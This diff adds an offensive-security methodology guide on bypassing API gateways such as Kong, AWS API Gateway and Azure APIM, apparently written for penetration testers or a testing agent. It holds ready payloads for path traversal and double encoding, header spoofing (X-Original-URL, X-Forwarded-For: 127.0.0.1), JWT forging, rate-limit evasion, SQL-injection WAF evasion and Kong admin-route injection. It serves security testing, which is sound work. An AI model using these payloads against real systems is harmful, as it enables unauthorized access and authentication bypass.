@@ -1,0 +1,288 @@
+<api_gateway_bypass_guide>
+<title>API GATEWAY BYPASS TECHNIQUES</title>
+
+<critical>API gateways (Kong, AWS API Gateway, Azure APIM) enforce authentication, rate limits, and WAF rules. Bypass techniques enable direct backend access, authentication relay, and security control circumvention. Focus on path normalization, header injection, backend endpoint discovery, and gateway-specific vulnerabilities.</critical>
+
+<scope>
+- Direct backend access (gateway bypass)
+- Kong, AWS API Gateway, Azure APIM specific bypasses
+- Path normalization exploits (../,  /./, //, %2e%2e)
+- Header injection to bypass authentication/authorization
+- Rate limit circumvention techniques
+- Authentication relay attacks
+- WAF rule bypass via gateway manipulation
+- Internal routing leakage
+</scope>
+
+<methodology>
+1. Identify gateway: response headers, error messages, fingerprinting
+2. Map routes: documented paths, undocumented endpoints via fuzzing
+3. Test path normalization: ../backend, /./api, //admin
+4. Test direct backend: resolve backend IP/hostname, test direct connection
+5. Test header manipulation: X-Original-URL, X-Rewrite-URL, Host
+6. Test rate limits: per-IP, per-key, per-route variations
+7. Test auth bypass: JWT validation, API key checks, OAuth tokens
+8. Test internal endpoints: health checks, metrics, admin panels
+</methodology>
+
+<direct_backend_access>
+<backend_discovery>
+- DNS enumeration: backend.example.com, api-backend.example.com
+- SSL certificate SANs: alternate names reveal backends
+- Error messages: stack traces, redirects leak backend URLs
+- Internal IP disclosure: headers, SSRF responses
+
+Test:
+nslookup backend-api.internal.example.com
+curl https://backend-internal.example.com/api/users
+</backend_discovery>
+
+<bypass_gateway>
+- If backend accessible publicly: bypass all gateway controls
+- Test authentication: may be missing on backend
+- Test rate limits: backend doesn't enforce
+- Test WAF: rules only on gateway, backend unprotected
+
+Direct to backend:
+curl http://10.0.1.50:8080/api/admin (bypasses gateway at api.example.com)
+</bypass_gateway>
+</direct_backend_access>
+
+<path_normalization>
+<traversal_sequences>
+- Gateway: /api/users (allowed)
+- Backend:/../admin (restricted)
+- Combined: /api/users/../admin → /api/admin
+
+Tests:
+/api/users/..;/admin
+/api/users/%2e%2e/admin
+/api/users/..%2fadmin
+/api/./admin
+/api//admin
+</traversal_sequences>
+
+<double_encoding>
+- %252e%252e%252f → %2e%2e%2f → ../
+- Gateway decodes once, backend decodes again
+- Bypass path validation
+
+/api/%252e%252e%252fadmin
+</double_encoding>
+
+<case_sensitivity>
+- Gateway: /api/users (case-sensitive)
+- Backend: /API/users, /Api/Users (case-insensitive)
+- Bypass: /API/admin (not matched by gateway rule)
+
+/API/ADMIN (uppercase)
+/api/Admin (mixed case)
+</case_sensitivity>
+</path_normalization>
+
+<header_injection_bypass>
+<url_override_headers>
+- X-Original-URL: /admin
+- X-Rewrite-URL: /admin
+- X-Forwarded-Path: /admin
+
+Request to gateway:
+GET /api/public HTTP/1.1
+Host: api.example.com
+X-Original-URL: /admin
+
+Gateway routes to /api/public (allowed)
+Backend processes X-Original-URL: /admin
+</url_override_headers>
+
+<host_header_manipulation>
+- Host: backend-internal.local
+- Gateway forwards to backend based on Host header
+- Access internal services
+
+GET /api/users HTTP/1.1
+Host: internal-admin.local
+
+Backend resolves as internal admin panel
+</host_header_manipulation>
+
+<forwarded_headers>
+- X-Forwarded-For: 127.0.0.1 (bypass IP whitelists)
+- X-Forwarded-Host: trusted.com (bypass host validation)
+- X-Forwarded-Proto: https (force HTTPS processing)
+
+GET /api/admin HTTP/1.1
+X-Forwarded-For: 127.0.0.1
+→ Appears as localhost request, bypasses IP filter
+</forwarded_headers>
+</header_injection_bypass>
+
+<rate_limit_bypass>
+<per_route_confusion>
+- Rate limit: 100/min on /api/users
+- No limit on: /api/v2/users, /API/users
+- Access same backend via different gateway routes
+
+for i in range(1000):
+    requests.get('/api/users')  # rate limited after 100
+    requests.get('/api/v2/users')  # not limited
+</per_route_confusion>
+
+<key_rotation>
+- Cycle through multiple API keys
+- Generate temporary keys via signup
+- Use header variations: X-API-Key, Authorization, api_key param
+</key_rotation>
+
+<ip_rotation>
+- X-Forwarded-For spoofing
+- Proxy rotation
+- IPv6 vs IPv4 (separate counters)
+</ip_rotation>
+</rate_limit_bypass>
+
+<authentication_relay>
+<gateway_jwt_validation>
+- Gateway validates JWT signature
+- Backend trusts JWT without validation
+- Forge JWT with same claims, different signature
+- Backend accepts if gateway forwards it
+
+Test:
+1. Get valid JWT from gateway
+2. Modify claims (role: admin)
+3. Re-sign with attacker key
+4. Send to backend directly (if accessible)
+5. Backend trusts JWT without validation
+</gateway_jwt_validation>
+
+<api_key_relay>
+- Gateway checks API key, adds header for backend
+- Discover header: X-API-Key-Validated: true
+- Add header directly to bypass gateway validation
+
+POST /api/backend HTTP/1.1
+X-API-Key-Validated: true
+→ Backend trusts header, bypasses gateway check
+</api_key_relay>
+</authentication_relay>
+
+<gateway_specific>
+<kong>
+- Admin API: :8001/routes, :8001/services
+- If exposed: full gateway config readable/writable
+- Path matching: regex bypasses via special chars
+
+Exploits:
+GET :8001/routes (read all routes)
+POST :8001/routes (add malicious route)
+Path: /api/users%00/admin (null byte bypass)
+</kong>
+
+<aws_api_gateway>
+- Resource policies: may allow public access
+- Stage variables: $stageVariables.backendUrl
+- Integration errors leak backend URLs
+- Throttling per stage: use default stage to bypass
+
+Bypasses:
+/prod/api/users (limited)
+/default/api/users (unlimited, forgotten stage)
+</aws_api_gateway>
+
+<azure_apim>
+- Backend URLs in portal: api-{name}.azure-api.net
+- Subscription keys: validate on gateway, not backend
+- Policy evaluation order: exploit policy gaps
+
+Bypass:
+Direct to backend: {service}.azurewebsites.net
+Subscription-Key: invalid → backend doesn't check
+</azure_apim>
+</gateway_specific>
+
+<waf_bypass>
+<rule_evasion>
+- Gateway WAF blocks: ' OR '1'='1
+- Backend parser: ' OR\n'1'='1 (newline not filtered)
+
+Payloads:
+' OR /**/ '1'='1 (comment bypass)
+' OR\u0020'1'='1 (unicode space)
+</rule_evasion>
+
+<content_type_switching>
+- WAF rules for application/json
+- Send application/xml, text/plain
+- Backend parses, gateway doesn't inspect
+
+POST /api/update
+Content-Type: text/plain
+{"malicious": "payload"}
+</content_type_switching>
+</waf_bypass>
+
+<internal_endpoints>
+<health_metrics>
+- /health, /metrics, /actuator, /status
+- Often bypass authentication
+- Leak internal state, versions, config
+
+GET /health → 200 OK {"backend": "10.0.1.50:8080"}
+GET /metrics → Prometheus metrics, internal IPs
+</health_metrics>
+
+<admin_panels>
+- /_admin, /admin/gateway, /console
+- Gateway admin interfaces
+- May lack authentication if assumed internal-only
+
+GET /_admin/config → gateway configuration
+GET /console → web-based management
+</admin_panels>
+</internal_endpoints>
+
+<validation>
+1. Identify gateway: fingerprint via headers, error messages
+2. Test path normalization: ../, //, %2e%2e, null bytes
+3. Test direct backend: enumerate backend hostname/IP, test direct access
+4. Test header injection: X-Original-URL, X-Forwarded-*, Host
+5. Test rate limits: route variations, key rotation, IP spoofing
+6. Test authentication: JWT relay, API key validation gaps
+7. Demonstrate impact: unauthorized access, WAF bypass, rate limit circumvention
+</validation>
+
+<false_positives>
+- Backend properly isolated (not publicly accessible)
+- Gateway path normalization correct
+- Authentication validated on both gateway and backend
+- Rate limits enforced consistently
+- WAF rules comprehensive across content types
+</false_positives>
+
+<impact>
+- Complete gateway bypass (all controls circumvented)
+- Unauthorized access to backend services
+- Rate limit bypass (DoS, resource abuse)
+- Authentication bypass (access without credentials)
+- WAF bypass (inject malicious payloads)
+- Internal network access (backend services)
+</impact>
+
+<pro_tips>
+1. Check SSL certificates for backend SANs—reveals internal hostnames
+2. Error messages often leak backend URLs—trigger errors intentionally
+3. Test all path normalization variations—gateways handle differently
+4. X-Original-URL and X-Rewrite-URL are common bypass vectors
+5. Admin APIs (Kong :8001, AWS Gateway CLI) often exposed
+6. Test health endpoints—usually bypass auth, leak internal IPs
+7. Different HTTP methods may have different rate limits
+8. Version endpoints (/v1/ vs /v2/) often have inconsistent rules
+9. Check for debug/staging routes—less protected
+10. SSRF can reveal backend IPs if gateway makes outbound requests
+11. Case sensitivity: test uppercase, mixed case routes
+12. Content-Type switching bypasses many WAF rules
+</pro_tips>
+
+<remember>API gateway security relies on proper backend isolation, consistent path normalization, header sanitization, and defense-in-depth. Never trust gateway-forwarded headers on backend, always validate authentication, and ensure backends aren't publicly accessible.</remember>
+</api_gateway_bypass_guide>
